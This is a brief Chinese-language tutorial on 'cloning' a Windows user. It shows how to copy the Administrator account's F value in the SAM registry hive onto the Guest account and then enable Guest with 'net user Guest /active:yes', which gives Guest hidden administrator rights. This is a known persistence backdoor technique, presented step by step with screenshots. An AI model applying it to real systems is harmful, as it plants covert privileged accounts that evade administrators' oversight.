# Windows克隆用户

# Windows克隆用户

运行输入`regedit`打开注册表

## 获取SAM权限：

<img src="https://pic.imgdb.cn/item/64db35e61ddac507cc6171b4.jpg" style="zoom: 80%;" />

<img src="https://pic.imgdb.cn/item/64db36071ddac507cc61d287.jpg" style="zoom: 67%;" />

​	

## 将Administrator的UID

路径：`HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\`

将Administrator的UID的F值复制给Guest的UID的F值：

<img src="https://pic.imgdb.cn/item/64db45af1ddac507cc88288a.jpg" style="zoom:50%;" />

<img src="https://pic.imgdb.cn/item/64db46261ddac507cc896d0b.jpg" style="zoom:50%;" />

<img src="https://pic.imgdb.cn/item/64db46ab1ddac507cc8ada93.jpg" style="zoom:50%;" />

​	

## 激活该用户

命令行输入`net user Guest /active:yes`

​	

​	

切到Guest用户可以观察到已经获得管理员权限：

![](https://pic.imgdb.cn/item/64db47e81ddac507cc8dac91.jpg)

